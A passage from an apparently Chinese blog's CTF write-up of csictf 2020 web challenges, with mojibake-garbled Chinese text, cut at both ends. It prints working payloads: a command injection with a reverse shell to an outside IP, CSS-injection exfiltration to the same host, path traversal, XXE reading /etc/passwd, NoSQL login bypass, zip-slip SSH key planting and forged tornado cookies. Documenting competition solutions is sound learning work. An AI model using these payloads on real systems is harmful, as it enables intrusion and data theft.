_0x51ee(&quot;0x7&quot;), _0x51ee(&quot;0x4&quot;), _0x51ee(&quot;0xa&quot;)]; window[easing[0]][easing[2]](&quot;9-12&quot;, &quot;BE*&quot;); window[easing[0]][easing[2]](_0x51ee(&quot;0x2&quot;), _0x51ee(&quot;0xb&quot;)); window[easing[0]][easing[2]](_0x51ee(&quot;0x6&quot;), &quot;5W&quot;); window[easing[0]][easing[2]](&quot;16&quot;, _0x51ee(&quot;0x9&quot;)); window[easing[0]][easing[2]](_0x51ee(&quot;0x5&quot;), &quot;pg&quot;); window[easing[0]][easing[2]](&quot;7-9&quot;, &quot;+n&quot;); window[easing[0]][easing[2]](_0x51ee(&quot;0xd&quot;), &quot;4t&quot;); window[easing[0]][easing[2]](_0x51ee(&quot;0x0&quot;), &quot;$F&quot;); if (window[easing[0]][easing[1]](_0x51ee(&quot;0x8&quot;)) === results[_0x51ee(&quot;0x1&quot;)](9, 12)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x2&quot;)) === results[&quot;substring&quot;](4, 7)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x6&quot;)) === results[_0x51ee(&quot;0x1&quot;)](0, 2)) &#123; if (window[easing[0]][easing[1]](&quot;16&quot;) === results[_0x51ee(&quot;0x1&quot;)](16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x5&quot;)) === results[_0x51ee(&quot;0x1&quot;)](12, 14)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xc&quot;)) === results[_0x51ee(&quot;0x1&quot;)](7, 9)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xd&quot;)) === results[_0x51ee(&quot;0x1&quot;)](14, 16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x0&quot;)) === results[_0x51ee(&quot;0x1&quot;)](2, 4)) &#123; return !![]; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; return ![];&#125;; å…¶å®å¯ä»¥ç›´æ¥çœ‹checkPasswordå‡½æ•°ï¼Œä¸‹é¢è¿™ä¸€å—åº”è¯¥æ˜¯ç»™å…ƒç´ èµ‹å€¼ 12345678window[easing[0]][easing[2]](&quot;9-12&quot;, &quot;BE*&quot;);window[easing[0]][easing[2]](_0x51ee(&quot;0x2&quot;), _0x51ee(&quot;0xb&quot;));window[easing[0]][easing[2]](_0x51ee(&quot;0x6&quot;), &quot;5W&quot;);window[easing[0]][easing[2]](&quot;16&quot;, _0x51ee(&quot;0x9&quot;));window[easing[0]][easing[2]](_0x51ee(&quot;0x5&quot;), &quot;pg&quot;);window[easing[0]][easing[2]](&quot;7-9&quot;, &quot;+n&quot;);window[easing[0]][easing[2]](_0x51ee(&quot;0xd&quot;), &quot;4t&quot;);window[easing[0]][easing[2]](_0x51ee(&quot;0x0&quot;), &quot;$F&quot;); ä¸‹é¢è¿™ä¸€å—å°±æ˜¯æ£€æŸ¥å¯†ç  123456789101112131415161718if (window[easing[0]][easing[1]](_0x51ee(&quot;0x8&quot;)) === results[_0x51ee(&quot;0x1&quot;)](9, 12)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x2&quot;)) === results[&quot;substring&quot;](4, 7)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x6&quot;)) === results[_0x51ee(&quot;0x1&quot;)](0, 2)) &#123; if (window[easing[0]][easing[1]](&quot;16&quot;) === results[_0x51ee(&quot;0x1&quot;)](16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x5&quot;)) === results[_0x51ee(&quot;0x1&quot;)](12, 14)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xc&quot;)) === results[_0x51ee(&quot;0x1&quot;)](7, 9)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0xd&quot;)) === results[_0x51ee(&quot;0x1&quot;)](14, 16)) &#123; if (window[easing[0]][easing[1]](_0x51ee(&quot;0x0&quot;)) === results[_0x51ee(&quot;0x1&quot;)](2, 4)) &#123; return !![]; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; return ![]; ä½†æ˜¯å¯ä»¥çœ‹åˆ°å¯†ç è¢«æ‹†åˆ†æˆå¾ˆå¤šéƒ¨åˆ†ï¼Œè€Œä¸”ä¸æ˜¯æŒ‰0ï¼Œ1ï¼Œ2ï¼Œ3â€¦é¡ºåºæ¥çš„ã€‚_0x51eeæˆ‘ä»¬ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå˜é‡ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸¤éƒ¨åˆ†ç»“åˆæ¥çœ‹ï¼Œå‘ç°å…ƒç´ èµ‹å€¼å’Œæ£€æŸ¥å¯†ç çš„é¡ºåºæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´9-12ä½æ˜¯BE*ï¼Œ4-7ä½æ˜¯_0x51ee(&quot;0xb&quot;)ï¼Œå¹¶ä¸”4-7å¯¹åº”_0x51ee(&quot;0x2&quot;)ï¼Œå†å›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹_0x575cæ•°ç»„ï¼Œåˆšå¥½_0x575c[0x02]=4-7ã€‚ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥å¾—åˆ°å¯†ç 5W$Fbb=+nBE*pg4t^7Mã€‚ Baby Count è€ƒå¯Ÿæ–‡ä»¶åŒ…å«+å‘½ä»¤æ‰§è¡Œ robots.txtæç¤ºæœ‰ä¸€ä¸ªcheckpass.phpæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨wrapperæ–‡ä»¶åŒ…å« checkpass.php 123456&lt;?php$password = &quot;w0rdc0unt123&quot;;// Cookie password.echo &quot;IMPORTANT!!! The page is still under development. This has a secret, do not push this page.&quot;;header(&#x27;Location: /&#x27;); wc.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;wc as a service&lt;/title&gt; &lt;style&gt; html, body &#123; overflow: none; max-height: 100vh; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body style=&quot;height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;&quot;&gt; &lt;?php ini_set(&#x27;max_execution_time&#x27;, 5); if ($_COOKIE[&#x27;password&#x27;] !== getenv(&#x27;PASSWORD&#x27;)) &#123; setcookie(&#x27;password&#x27;, &#x27;PASSWORD&#x27;); die(&#x27;Sorry, only people from csivit are allowed to access this page.&#x27;); &#125; ?&gt; &lt;h1&gt;Character Count as a Service&lt;/h1&gt; &lt;form&gt; &lt;input type=&quot;hidden&quot; value=&quot;wc.php&quot; name=&quot;file&quot;&gt; &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;text&quot; rows=30 cols=100&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;?php if (isset($_GET[&quot;text&quot;])) &#123; $text = $_GET[&quot;text&quot;]; echo &quot;&lt;h2&gt;The Character Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $text . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; æŠŠcookieä¸­çš„passwordæ”¹æˆw0rdc0unt123ï¼Œå°±å¯ä»¥è¾“å…¥textäº† æ¥çœ‹ä¸€ä¸‹åç«¯çš„å¤„ç†é€»è¾‘ï¼š 123456&lt;?php if (isset($_GET[&quot;text&quot;])) &#123; $text = $_GET[&quot;text&quot;]; echo &quot;&lt;h2&gt;The Character Count is: &quot; . exec(&#x27;printf \\&#x27;&#x27; . $text . &#x27;\\&#x27; | wc -c&#x27;) . &quot;&lt;/h2&gt;&quot;; &#125;?&gt; å¾ˆæ˜æ˜¾$textå‚æ•°æ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚payloadå¦‚ä¸‹ï¼š 1&#39;; whoami # åå¼¹ä¸€ä¸ªshell 1&#39;; php -r &#39;$sock&#x3D;fsockopen(&quot;47.97.199.89&quot;,11000);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; # å…¨å±€æŸ¥æ‰¾ä¸€ä¸‹flagæ–‡ä»¶ /ctf/system/of/a/down/flag.txtæ˜¾ç¤ºæƒé™ä¸å¤Ÿ READMEé‡Œé¢æœ‰ä¸€æ®µHashåŠ å¯†çš„å€¼ï¼Œé€åˆ°å·¥å…·é‡Œé¢å»è¯†åˆ«æ˜¯MD5åŠ å¯†ï¼Œæ”¾åˆ°ç½‘ä¸Šå»è·‘æ²¡æœ‰æ‹å‡ºæ¥ï¼Œçœ‹å…¶ä»–çš„wpæ˜¯csictf åˆ‡æ¢æˆctfç”¨æˆ· The Confused Deputy è€ƒå¯ŸCSSæ³¨å…¥ è„šæœ¬ç”Ÿæˆpayload 123456f = open(&quot;poc.css&quot;, &quot;w&quot;)dic = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;for i in dic: payload = &#x27;&#x27;&#x27;#000000;&#125; input[type=password][value^=&quot;&#x27;&#x27;&#x27; + i + &#x27;&#x27;&#x27;&quot;]&#123;background-image:url(&quot;http://47.97.199.89:8888/?flag=&#x27;&#x27;&#x27; + i + &#x27;&#x27;&#x27;&quot;);&#125; &#x27;&#x27;&#x27; f.write(payload + &quot;\\n&quot;)f.close() æ”¾åˆ°burp intrudeæ¨¡å—çˆ†ç ´ åœ¨VPSä¸Šç›‘å¬ç«¯å£ é€æ¬¡çˆ†ç ´å„ä¸ªä½ç½®å¾—åˆ°flagã€‚ File Library é¢˜ç›®ç›´æ¥ç»™äº†æºä»£ç server.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566const express = require(&#x27;express&#x27;);const path = require(&#x27;path&#x27;);const fs = require(&#x27;fs&#x27;);const app = express();const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123; console.log(`Listening on port $&#123;PORT&#125;`);&#125;);app.get(&#x27;/getFile&#x27;, (req, res) =&gt; &#123; let &#123; file &#125; = req.query; if (!file) &#123; res.send(`file=$&#123;file&#125;\\nFilename not specified!`); return; &#125; try &#123; if (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;)) &#123; res.send(`file=$&#123;file&#125;\\nInvalid filename!`); return; &#125; &#125; catch (err) &#123; res.send(&#x27;An error occured!&#x27;); return; &#125; if (!allowedFileType(file)) &#123; res.send(`File type not allowed`); return; &#125; if (file.length &gt; 5) &#123; file = file.slice(0, 5); &#125; const returnedFile = path.resolve(__dirname + &#x27;/&#x27; + file); fs.readFile(returnedFile, (err) =&gt; &#123; if (err) &#123; if (err.code != &#x27;ENOENT&#x27;) console.log(err); res.send(&#x27;An error occured!&#x27;); return; &#125; res.sendFile(returnedFile); &#125;);&#125;);app.get(&#x27;/*&#x27;, (req, res) =&gt; &#123; res.sendFile(__dirname + &#x27;/index.html&#x27;);&#125;);function allowedFileType(file) &#123; const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1); if (format == &#x27;js&#x27; || format == &#x27;ts&#x27; || format == &#x27;c&#x27; || format == &#x27;cpp&#x27;) &#123; return true; &#125; return false;&#125; é¡µé¢å†…è¿˜ç»™äº†ä¸¤ä¸ªæç¤ºï¼š ok.js 123456789101112131415161718192021222324252627console.log(&#x27;Welcome to my sample javascript program!&#x27;);// Let&#x27;s checkout some funny issues in JS![] == ![]; // -&gt; truefalse == []; // -&gt; truefalse == ![]; // -&gt; trueconsole.log(&quot;b&quot; + &quot;a&quot; + +&quot;a&quot; + &quot;a&quot;); // -&gt; baNaNaNaN === NaN; // -&gt; false(![] + [])[+[]] + (![] + [])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]];// -&gt; &#x27;fail&#x27;document.all instanceof Object; // -&gt; truetypeof document.all; // -&gt; &#x27;undefined&#x27;Number.MIN_VALUE &gt; 0; // -&gt; true[1, 2, 3] + [4, 5, 6]; // -&gt; &#x27;1,2,34,5,6&#x27;console.log(&#x27;View more: https://github.com/denysdovhan/wtfjs&#x27;); a.cpp 1234#include &lt;stdlib.h&gt;int main() &#123; system(&quot;cat flag.txt&quot;);&#125; åº”è¯¥å°±æ˜¯å°è¯•åˆ©ç”¨server.jsè¯»å–flag.txtã€‚ å®¡è®¡æºä»£ç ï¼Œä¸»è¦æ˜¯ç”±ä¸¤ä¸ªå…³é”®çš„å¤„ç†ï¼š æ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯js, ts, c, cpp 1234if (!allowedFileType(file)) &#123; res.send(`File type not allowed`); return; &#125; å–æ–‡ä»¶åçš„å‰äº”ä½ 123if (file.length &gt; 5) &#123; file = file.slice(0, 5); &#125; æœ€åç”¨path.resolveæ‹¼æ¥æˆæœ€ç»ˆè·¯å¾„ã€‚ payloadå°±ç›´æ¥ç»™å‡ºæ¥äº†ï¼Œåæ­£æˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚ã€‚ã€‚ 1&#x2F;getFile?file[]&#x3D;f&amp;file[]&#x3D;4&amp;file[]&#x3D;k&amp;file[]&#x3D;e&amp;file[]&#x3D;&#x2F;..&#x2F;flag.txt&amp;file[]&#x3D;.&amp;file[]&#x3D;js åˆ©ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œnode.jsä¼šè§£ææˆ 1file[] &#x3D; [&quot;f&quot;,&quot;4&quot;,&quot;k&quot;,&quot;e&quot;,&quot;&#x2F;..&#x2F;flag.txt&quot;,&quot;.&quot;,&quot;js&quot;] è¿™æ ·å°±å¯ä»¥ç»•è¿‡åç¼€åå’Œæ–‡ä»¶é•¿åº¦çš„æ£€æŸ¥ã€‚ è¿™é‡Œè¿˜åˆ©ç”¨äº†path.resolveçš„ä¸€ä¸ªç‰¹æ€§ The method creates absolute path from right to left until an absolute path is constructed è¯¥æ–¹æ³•ä»å³åˆ°å·¦åˆ›å»ºç»å¯¹è·¯å¾„ï¼Œç›´åˆ°æ„é€ äº†ç»å¯¹è·¯å¾„ã€‚ ä¹Ÿå°±æ˜¯æ‰§è¡Œå®Œä¸‹é¢çš„è¯­å¥ 1const returnedFile = path.resolve(__dirname + &#x27;/&#x27; + [&quot;f&quot;,&quot;4&quot;,&quot;k&quot;,&quot;e&quot;,&quot;/../flag.txt&quot;]); ç»“æœå°±æ˜¯__dirname+'/'+'/../flag.txt' The Usual Suspects è€ƒå¯Ÿtornadoæ¨¡æ¿æ³¨å…¥+ç”Ÿæˆcookie secret å¾ˆæ˜æ˜¾å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œç”¨&#123;&#123;7*'7'&#125;&#125;éªŒè¯ä¸€ä¸‹ æŸ¥çœ‹å½“å‰ç½‘é¡µçš„cookie 1&quot;2|1:0|10:1595941408|5:admin|8:ZmFsc2U&#x3D;|bfe7af9eba0d5c6717c341e50fd8660db4e4fccbce187a20c1236205df3e3171&quot; ZmFsc2U=æ˜¯falseçš„base64ç¼–ç  é¢˜ç›®æç¤ºè¦æ‹¿secretï¼Œç”¨&#123;&#123;config&#125;&#125;ç›´æ¥æŠ¥é”™ Googleä¸€ä¸‹tornado cookie secret https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings ç”¨global()æŸ¥çœ‹å½“å‰å…¨å±€å˜é‡ ç”¨application.settingsè·å–cookie_secret ç”¨è„šæœ¬ç”Ÿæˆtornado cookies 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import hmacimport hashlibfrom typing import ( Dict, Any, Union, Optional, Awaitable, Tuple, List, Callable, Iterable, Generator, Type, cast, overload,)_UTF8_TYPES = (bytes, type(None))unicode_type = strdef utf8(value: Union[None, str, bytes]) -&gt; Optional[bytes]: # noqa: F811 &quot;&quot;&quot;Converts a string argument to a byte string. If the argument is already a byte string or None, it is returned unchanged. Otherwise it must be a unicode string and is encoded as utf8. &quot;&quot;&quot; if isinstance(value, _UTF8_TYPES): return value if not isinstance(value, unicode_type): raise TypeError(&quot;Expected bytes, unicode, or None; got %r&quot; % type(value)) return value.encode(&quot;utf-8&quot;)def _create_signature_v2(secret: Union[str, bytes], s: bytes) -&gt; bytes: hash = hmac.new(utf8(secret), digestmod=hashlib.sha256) hash.update(utf8(s)) return utf8(hash.hexdigest())def format_field(s: Union[str, bytes]) -&gt; bytes: return utf8(&quot;%d:&quot; % len(s)) + utf8(s)to_sign = b&quot;|&quot;.join( [ b&quot;2&quot;, format_field(&quot;0&quot;), format_field(&quot;1595249713&quot;), format_field(&quot;admin&quot;), format_field(&quot;dHJ1ZQ==&quot;), b&quot;&quot;, ] )print(to_sign + _create_signature_v2(&#x27;MangoDB\\n&#x27;,to_sign)) ç”¨è¿™ä¸ªæ›´æ¢åŸå§‹çš„cookieï¼Œæ‹¿åˆ°flagã€‚ CCC è€ƒå¯Ÿæ–‡ä»¶åŒ…å«+JWT åœ¨å³ä¾§èœå•æ ä¸­Our Adminså’ŒLoginä¸èƒ½ç›´æ¥ç‚¹å¼€ï¼Œä½†æ˜¯é€šè¿‡æºä»£ç å¯ä»¥çœ‹åˆ°é“¾æ¥äº†ä¸¤ä¸ªåœ°å€ï¼š/adminNameså’Œ/loginã€‚ è®¿é—®/adminNamesç›´æ¥ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªgithubä»“åº“åœ°å€ï¼šhttps://github.com/csivitu/authorized_users/blob/master è®¿é—®/loginæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œéšä¾¿è¾“å…¥admin:adminï¼Œè¿”å›åŒ…ä¸­æœ‰ä¸€ä¸ªJWT token æ‹¿åˆ°jwt.ioè§£ç ä¸€ä¸‹ 123456&#123; &quot;username&quot;: &quot;nqzva&quot;, &quot;password&quot;: &quot;nqzva&quot;, &quot;admin&quot;: &quot;snyfr&quot;, &quot;iat&quot;: 1595922746&#125; nqzvaç”¨ROT13è§£å¯†å¾—åˆ°adminï¼Œsnyfrç”¨ROT13è§£å¯†å¾—åˆ°flaseï¼Œå¹¶ä¸”ä¸ç®¡è¾“å…¥ä»€ä¹ˆç”¨æˆ·åå’Œå¯†ç ï¼Œéƒ½æ˜¯ç›¸åŒçš„tokenï¼Œé‚£ä¹ˆç°åœ¨å°±éœ€è¦æ‹¿åˆ°secretã€‚ å›å¤´å†æ¥çœ‹/adminNamesï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶åŒ…å« é‚£ä¹ˆä¹…å¯ä»¥è¯»å–node.jsçš„ç¯å¢ƒå˜é‡../.envï¼Œæ‹¿åˆ°secret 1JWT_SECRET&#x3D;Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1 ç”Ÿæˆtoken é€šè¿‡æ‰«æç›®å½•å¾—åˆ°/adminï¼Œè®¿é—®è¿”å›ï¼š 1&#123;&quot;success&quot;:false,&quot;message&quot;:&quot;Invalid Token, Headers?&quot;&#125; é€šè¿‡Authorizationå­—æ®µå‘é€è¯·æ±‚åŒ… ROT13è§£å¯†å¾—åˆ°flagã€‚ Linux AKA å¤§éƒ¨åˆ†çš„å‘½ä»¤éƒ½è®¾ç½®äº†aliasï¼Œä½†æ˜¯bashå‘½ä»¤æ²¡æœ‰ã€‚ find32 æ„Ÿè§‰è¿™é¢˜è„‘æ´è¿˜æ˜¯æŒºå¤§çš„ã€‚ã€‚ SSHç™»å½•åæœ‰å¾ˆå¤šæ–‡ä»¶ï¼Œå†…å®¹ä¹Ÿæ˜¯éšæœºçš„å­—æ¯ï¼Œ32åœ¨ASCIIç ä¸­ä»£è¡¨ç©ºæ ¼å­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨CTFçš„flagä¸­å°±æ˜¯_æ¥ä»£æ›¿ã€‚ å†™ä¸€ä¸ªè„šæœ¬ä¼ åˆ°é¶æœºä¸Šå» 123456789101112131415import ospath = &quot;/user1/&quot; files = os.listdir(path)for file in files: if not os.path.isdir(file): try: with open(path+file, &#x27;r&#x27;) as f: print(&#x27;[+]&#x27; + path + file) for line in f.readlines(): if &#x27;_&#x27; in line: print(file) except FileNotFoundError: print(&#x27;[-]&#x27; + file) continue æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œæç¤ºè¦ç”¨user2æ¥ç™»å½• sshç™»å½•ä¹‹åï¼Œå½“å‰ç›®å½•ä¸‹æœ‰å‡ ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å¤§å°ç±»ä¼¼ï¼Œç”¨diffå‘½ä»¤ä¸€ä¸ªä¸ªæ¯”è¾ƒä¸€ä¸‹ HTB 0x01 nmapæ‰«æå‡º5001ç«¯å£è¿è¡ŒftpæœåŠ¡ï¼Œç›´æ¥anonymousç™»å½•æ‹¿flagã€‚ HTB 0x02~0x05 nmapæ‰«æç«¯å£ 1222&#x2F;tcp open ssh3000&#x2F;tcp open http å…ˆæ¥çœ‹çœ‹3000ç«¯å£ï¼Œè®¿é—®http://34.93.215.188:3000/ï¼Œæœ‰ä¸€ä¸ªç™»å½•æ¡† å…ˆç”¨1 or 1=1 , 1' or 1=1 --ï¼Œ';-#$()æ¥æµ‹è¯•æ˜¯ä¸æ˜¯SQLæ³¨å…¥ï¼Œç»“æœç›´æ¥è¿”å›No user with username: ';-#$() and password: ';-#$()ã€‚å†ç”¨burp fuzzä¸€ä¸‹å¸¸ç”¨çš„payloadå‘ç°æ˜¯NoSQLæ³¨å…¥ï¼Œç›´æ¥ç”¨ä¸‡èƒ½å¯†ç ï¼š 1username[$ne]&#x3D;ca01h&amp;password[$ne]&#x3D;ca01h å…·ä½“åŸç†å¯ä»¥å‚è€ƒå¦å¤–ä¸€ç¯‡åšæ–‡ï¼šNoSQLæ³¨å…¥ä¹‹MongoDB ç™»å½•æˆåŠŸåè·³è½¬åˆ°ä¸Šä¼ é¡µé¢ ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œå†æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°HTB 0x02çš„flag çœ‹åˆ°å¯ä»¥ç”¨ä¸ç”¨çš„æ•°æ®æ ¼å¼æäº¤æŸ¥è¯¢ï¼Œæœ‰ä¸€ä¸ªæ˜¯XMLï¼Œç”¨ä¸‹é¢çš„payloadçœ‹çœ‹æ˜¯å¦å­˜åœ¨XXEæ³¨å…¥ 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt; å‘ç°/etc/passwdæš—è—ä¸€ä¸ªgiståœ°å€ï¼šhttps://gist.github.com/sivel/c68f601137ef9063efd7 æ˜¯ä¸€ä¸ªç®¡ç†SSH Keyçš„å·¥å…·ï¼Œé‡Œé¢æåˆ°äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œ/usr/local/bin/userkeys.shå’Œ/etc/sshd/sshd_configã€‚åˆ†åˆ«ç”¨ä¸Šé¢çš„XXE payloadçœ‹ä¸€ä¸‹æ–‡ä»¶å†…å®¹ /etc/sshd/sshd_config 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121# This is the sshd server system-wide configuration file. See# sshd_config(5) for more information.# This sshd was compiled with PATH&#x3D;&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;sbin# The strategy used for options in the default sshd_config shipped with# OpenSSH is to specify options with their default value where# possible, but leave them commented. Uncommented options override the# default value.Include &#x2F;etc&#x2F;ssh&#x2F;sshd_config.d&#x2F;*.conf#Port 22#AddressFamily any#ListenAddress 0.0.0.0#ListenAddress ::#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key# Ciphers and keying#RekeyLimit default none# Logging#SyslogFacility AUTH#LogLevel INFO# Authentication:#LoginGraceTime 2m#PermitRootLogin prohibit-password#StrictModes yes#MaxAuthTries 6#MaxSessions 10#PubkeyAuthentication yes# Expect .ssh&#x2F;authorized_keys2 to be disregarded by default in future.#AuthorizedKeysFile\\t.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2#AuthorizedPrincipalsFile none# csictf&#123;cu5t0m_4uth0rizat10n&#125;AuthorizedKeysCommand &#x2F;usr&#x2F;local&#x2F;bin&#x2F;userkeys.shAuthorizedKeysCommandUser nobody# For this to work you will also need host keys in &#x2F;etc&#x2F;ssh&#x2F;ssh_known_hosts#HostbasedAuthentication no# Change to yes if you don&#39;t trust ~&#x2F;.ssh&#x2F;known_hosts for# HostbasedAuthentication#IgnoreUserKnownHosts no# Don&#39;t read the user&#39;s ~&#x2F;.rhosts and ~&#x2F;.shosts files#IgnoreRhosts yes# To disable tunneled clear text passwords, change to no here!PasswordAuthentication no#PermitEmptyPasswords no# Change to yes to enable challenge-response passwords (beware issues with# some PAM modules and threads)ChallengeResponseAuthentication no# Kerberos options#KerberosAuthentication no#KerberosOrLocalPasswd yes#KerberosTicketCleanup yes#KerberosGetAFSToken no# GSSAPI options#GSSAPIAuthentication no#GSSAPICleanupCredentials yes#GSSAPIStrictAcceptorCheck yes#GSSAPIKeyExchange no# Set this to &#39;yes&#39; to enable PAM authentication, account processing,# and session processing. If this is enabled, PAM authentication will# be allowed through the ChallengeResponseAuthentication and# PasswordAuthentication. Depending on your PAM configuration,# PAM authentication via ChallengeResponseAuthentication may bypass# the setting of \\&quot;PermitRootLogin without-password\\&quot;.# If you just want the PAM account and session checks to run without# PAM authentication, then enable this but set PasswordAuthentication# and ChallengeResponseAuthentication to &#39;no&#39;.UsePAM yes#AllowAgentForwarding yes#AllowTcpForwarding yes#GatewayPorts noX11Forwarding yes#X11DisplayOffset 10#X11UseLocalhost yes#PermitTTY yesPrintMotd no#PrintLastLog yes#TCPKeepAlive yes#PermitUserEnvironment no#Compression delayed#ClientAliveInterval 0#ClientAliveCountMax 3#UseDNS no#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid#MaxStartups 10:30:100#PermitTunnel no#ChrootDirectory none#VersionAddendum none# no default banner path#Banner none# Allow client to pass locale environment variablesAcceptEnv LANG LC_*# override default of no subsystemsSubsystem\\tsftp\\t&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;sftp-server# Example of overriding settings on a per-user basis#Match User anoncvs#\\tX11Forwarding no#\\tAllowTcpForwarding no#\\tPermitTTY no#\\tForceCommand cvs server&quot; å…¶ä¸­åŒ…å«äº†HTB 0x05çš„flagï¼šcsictf&#123;cu5t0m_4uth0rizat10n&#125; æ¥ç€çœ‹/usr/local/bin/userkeys.sh 1234567#!&#x2F;bin&#x2F;bashif [ \\&quot;$1\\&quot; &#x3D;&#x3D; \\&quot;csictf\\&quot; ]; then cat &#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;*else echo \\&quot;\\&quot;fi é¢˜ç›®çš„æ„æ€åº”è¯¥è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªPublic Keyåˆ°/home/administrator/uploads/keys/ï¼Œç„¶åç”¨sshç™»å½•ï¼Œèƒ½ä¸Šä¼ çš„åœ°æ–¹å°±åªæœ‰ä¹‹å‰é‚£ä¸ªzip uploadã€‚çœ‹èµ›åçš„wpï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯zip slipæ¼æ´ï¼šZip Slip Vulnerability å…ˆåœ¨æœ¬æœºä¸Šç”Ÿæˆä¸€ä¸ªssh public keyï¼Œç„¶åç‰¹æ®Šçš„zipå‹ç¼©æ–‡ä»¶ï¼Œä¸Šä¼  123$ ssh-keygen -t rsa #filename:my_key$ 7z a zip-slip.zip my_key.pub$ 7z rn zip-slip.zip my_key.pub &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;dunsp4rce.pub&#39; è¿”å›&#123;success: true&#125; å†sshç™»å½•ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹å¾—åˆ°HTB 0x03çš„flag æ¥ç€å°±æ˜¯å»/homeç›®å½•ä¸‹æ‰¾å„ç§æ–‡ä»¶äº† åœ¨/home/administrator/website/models/db.jsä¸­å‘ç°HTB 0x06çš„flagã€‚ å¹¶ä¸”è¿˜ç»™å‡ºäº†mongodbç™»å½•çš„å£ä»¤ æ‹¿åˆ°HTB 0x04çš„flagã€‚ Reference https://dunsp4rce.github.io/csictf-2020/ https://github.com/team0se7en/CTF-Writeups/tree/master/csictf2020/","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"DASCTF2020ä¸ƒæœˆèµ›","date":"2020-07-25T09:10:59.000Z","path":"Web_security/ctf_writeup/19.DASCTF2020ä¸ƒæœˆèµ›/","text":"DASCTFä¸ƒæœˆèµ› Web Writeup EzFileInclude 